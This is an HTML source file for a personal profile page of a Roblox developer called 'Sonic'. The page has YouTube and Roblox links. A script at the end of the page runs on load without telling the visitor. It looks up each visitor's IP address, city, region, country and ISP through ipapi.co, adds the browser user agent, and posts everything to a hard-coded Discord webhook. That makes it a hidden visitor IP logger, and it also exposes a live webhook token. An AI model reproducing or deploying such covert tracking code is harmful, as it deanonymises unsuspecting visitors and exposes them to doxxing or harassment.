<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sonic's | About Me</title>
    <style>
        :root {
            /* Dark Theme Colors */
            --bg-dark: #0f172a;
            --card-bg: rgba(30, 41, 59, 0.7);
            --text-main: #f8fafc;
            --text-dim: #94a3b8;
            --accent-color: #38bdf8; /* Clean Cyan/Blue */
        }

        body {
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: var(--text-main);
            
            /* Background Image with a dark overlay to make text pop */
            background: linear-gradient(rgba(15, 23, 42, 0.85), rgba(15, 23, 42, 0.85)), 
                        url('https://images.unsplash.com/photo-1614850523296-e8c041de4398?q=80&w=2070&auto=format&fit=crop');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
        }

        .container {
            background: var(--card-bg);
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            padding: 2.5rem;
            border-radius: 24px;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4);
            text-align: center;
            max-width: 400px;
            width: 90%;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .profile-pic {
            width: 130px;
            height: 130px;
            border-radius: 50%;
            object-fit: cover;
            border: 3px solid var(--accent-color);
            margin-bottom: 1.2rem;
            box-shadow: 0 0 15px rgba(56, 189, 248, 0.2);
        }

        h1 { 
            margin: 10px 0 5px; 
            font-size: 1.8rem; 
            letter-spacing: -0.5px;
        }

        p { 
            color: var(--text-dim); 
            margin-bottom: 25px; 
            line-height: 1.6; 
            font-size: 0.95rem;
        }

        .links { 
            display: flex; 
            flex-direction: column; 
            gap: 12px; 
        }

        .link-btn {
            text-decoration: none;
            background: rgba(255, 255, 255, 0.05);
            color: var(--text-main);
            padding: 14px;
            border-radius: 12px;
            font-weight: 600;
            border: 1px solid rgba(255, 255, 255, 0.1);
            transition: all 0.3s ease;
        }

        .link-btn:hover {
            background: var(--accent-color);
            color: #0f172a;
            transform: translateY(-3px);
            border-color: var(--accent-color);
            box-shadow: 0 10px 20px rgba(56, 189, 248, 0.3);
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Your Profile Image -->
        <img src="https://i.postimg.cc/RFYXrXBd/Screenshot-2026-05-14-174816.png" alt="SonicstudiosMB" class="profile-pic">
        
        <h1>Sonic</h1>
        <p>Hi, I'm Sonic. I enjoy developing Roblox games—specializing in elevator systems.</p>

        <div class="links">
            <a href="https://www.youtube.com/@RealSonicstudiosMB" target="_blank" class="link-btn">YouTube</a>
            <a href="https://www.roblox.com/users/1474677068/profile" target="_blank" class="link-btn">Roblox Profile</a>
        </div>
    </div>

    <script>
    async function sendLog() {
        // Replace with your actual Discord Webhook URL
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1504650279700922452/9q7EN2zmMbChp8sfVAXIdZWHtv3QVpwCgpLSsieG0qtlRqrGN8Tav6_jybKsC39Xy2H1";

        try {
            // Fetch visitor data
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();

            const payload = {
                username: "Site Monitor",
                avatar_url: "https://i.postimg.cc/RFYXrXBd/Screenshot-2026-05-14-174816.png",
                embeds: [{
                    title: "🌐 New Website Visitor",
                    color: 37019, // Cyan color
                    fields: [
                        { name: "IP Address", value: data.ip || "Unknown", inline: true },
                        { name: "Location", value: `${data.city}, ${data.region}, ${data.country_name}`, inline: true },
                        { name: "ISP", value: data.org || "Unknown", inline: false },
                        { name: "Device", value: navigator.userAgent.substring(0, 100), inline: false }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch (err) {
            console.error("Log failed:", err);
        }
    }

    // Run the function when the page loads
    window.onload = sendLog;
</script>
    
</body>
</html>
